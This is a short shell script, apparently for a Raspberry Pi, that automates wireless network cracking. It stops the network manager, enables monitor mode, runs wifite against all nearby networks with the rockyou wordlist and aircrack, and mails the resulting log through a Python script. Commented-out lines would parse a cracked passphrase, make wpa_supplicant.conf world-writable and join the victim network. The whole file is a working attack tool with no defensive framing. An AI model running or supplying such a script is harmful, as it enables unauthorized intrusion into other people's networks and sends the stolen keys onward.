#!/bin/sh
#sudo rm /home/pi/cracked.txt
sudo /etc/init.d/network-manager stop
sudo airmon-ng start wlan0
sudo /home/pi/reaver-1.4/src/wifite.py -i mon0 -all --pow 50 -dict /pentest/passwords/wordlists/rockyou.txt -aircrack > /home/pi/reaver-1.4/src/log.txt
#sudo /home/pi/reaver-1.4/src/wifite.py -e "Netflix" --pow 50 -dict /pentest/passwords/wordlists/darkc0de.lst -aircrack > /home/pi/reaver-1.4/src/log.txt
# line=$(head -n 1 /home/pi/cracked.txt);
# linesplit=(${line//\t/});
#aangepaste rechten aan dit bestand geven
# sudo chmod 777 /etc/wpa_supplicant.conf
# sudo wpa_passphrase ${linesplit[1]} ${linesplit[2]} >> /etc/wpa_supplicant.conf
# sudo wpa_supplicant -B -Dnl80211 -iwlan0 -c/etc/wpa_supplicant.conf 
# sudo iwconfig wlan0 essid ${linesplit[1]} key ${linesplit[2]}
# sudo dhclient -v wlan0
sudo python /home/pi/mailLog.py